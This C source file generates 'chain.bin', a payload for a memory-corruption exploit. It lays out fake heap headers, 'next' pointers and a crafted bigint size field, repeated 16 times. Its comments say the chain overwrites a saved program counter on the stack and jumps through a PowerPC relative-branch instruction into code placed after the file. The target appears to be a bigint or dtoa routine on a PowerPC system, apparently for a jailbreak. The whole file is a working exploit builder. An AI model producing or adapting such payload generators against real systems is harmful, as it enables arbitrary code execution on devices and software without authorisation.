#include <stdio.h>
#include <stdint.h>

uint32_t invert_byteorder(uint32_t data) {
	return (data & 0x000000FF) << 24u | (data & 0x0000FF00) << 8u | (data & 0x00FF0000) >> 8u | (data & 0xFF000000) >> 24u;
}

int main(int argc, char *argv[]) {
	
	uint32_t target_overwrite = 0x80DFF5BC; // Saved PC in stack (choose to be as close as possible while not resulting in an invalid/bad instruction)
	
	uint32_t marker = 0xDEADBEEF; // Easy to see marker (must be non zero or else decimal alignment will be incorrect)
	uint32_t heap_header = 0x706F6E79; // PONY
	uint32_t bigint_next = 0x6E657874; // next
	uint32_t bigint_k = (target_overwrite - 0x81703d64) >> 2;
	uint32_t relative_jump = 0x48000028; // Relative jump: b .+0x28
	uint32_t null_bytes = 0x00000000;
	
	size_t chain_iterations = 16;
	
	uint32_t chain_layout[] = {
		marker, // Beginning of bigint x region
		0x00000000, // End of bigint x region
		0x00000000, // Heap padding
		0x00000000, // Heap padding
		heap_header, // Heap header for next bigint block
		bigint_next, // next pointer for the following bigint
		bigint_k, // k size of the following bigint
		relative_jump, // A relative jump forward (overlaps maxwds)
		0x00000000, // sign
		0x00000000 // wds
	};
	
	printf("Overwrite will be at 0x%X\n", target_overwrite);
	printf("Instructions executed will be *(0x%X) 0x%X 0x%X\n", target_overwrite, bigint_k, relative_jump);
	
	FILE *chain = fopen("chain.bin", "wb");
	if (!chain) {
		printf("Error opening chain.bin\n");
		return 1;
	}
	
	for (size_t i = 0; i < sizeof(chain_layout)/sizeof(uint32_t); i++) {
		chain_layout[i] = invert_byteorder(chain_layout[i]);
	}

	for (size_t i = 0; i < chain_iterations; i++) {
		fwrite(chain_layout, sizeof(chain_layout), 1, chain);
	}
	
	fwrite(&null_bytes, 4, 1, chain); // Write a couple more null bytes so that we pad execution to start immediatly after this chain.bin ends
	fwrite(&null_bytes, 4, 1, chain);
	fwrite(&null_bytes, 4, 1, chain);
	fwrite(&null_bytes, 4, 1, chain);
	fwrite(&null_bytes, 4, 1, chain);
	fwrite(&null_bytes, 4, 1, chain);
	fwrite(&null_bytes, 4, 1, chain);
	
	fclose(chain);
	
	return 0;
}
